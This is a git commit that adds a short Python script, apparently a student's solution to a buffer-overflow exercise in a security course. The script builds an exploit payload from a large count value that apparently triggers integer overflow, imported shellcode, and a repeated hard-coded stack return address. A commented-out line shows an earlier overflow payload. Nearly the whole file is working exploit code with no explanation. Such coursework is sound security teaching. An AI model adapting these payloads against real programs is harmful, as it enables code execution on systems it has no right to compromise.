073300d5b013f676eeec512a80a5ec9d618a1a93
Hsuan-Chi Kuo <hsuanchikuo@gmail.com>
2017-09-26 01:15:32 -0400

    done 2.2.5

---
+++ mp2/2.2.5.py
@@ -0,0 +1,8 @@
+from shellcode import shellcode
+from struct import pack
+
+count = 0x40000000
+shellcodeAdd = 0xbffef200
+print pack("<I", count) + shellcode + '\x00' + pack("<I", shellcodeAdd) * (0x59 - len(shellcode))
+
+# print pack("<I", count) + shellcode + 'X' * (2056 - len(shellcode) - 8) + pack("<I" , shellcodeAdd) + pack("<I", returnAdd)
